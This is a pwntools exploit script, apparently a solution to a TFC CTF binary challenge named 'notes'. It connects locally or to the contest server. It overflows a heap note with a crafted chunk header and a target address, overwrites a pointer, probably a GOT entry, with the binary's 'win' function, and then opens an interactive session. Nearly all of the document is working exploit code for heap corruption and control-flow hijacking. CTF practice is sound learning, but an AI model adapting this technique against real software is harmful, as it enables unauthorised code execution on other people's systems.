#!/usr/bin/python3

from pwn import *

exe = ELF('notes', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b* 0x00000000004013f8
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.tfcctf.com', 31835)
else:
        p = process(exe.path)

GDB()
def add(idx, content):
        sla(b"Exit", b"1")
        sla(b"index", str(idx))
        sla(b"content", str(content).encode())
def edit(idx, context):
        sla(b"Exit", b"2")
        sla(b"index", str(idx))
        sla(b"content", context)
add(0, "888888")
add(1, "888888")
add(2, "888888")
payload = b"a"*0x10 + p64(0x0) + p64(0x21) + p64(0x404040)
edit(0, payload) 
payload = p64(exe.sym.win)
edit(1, payload) 
p.interactive()
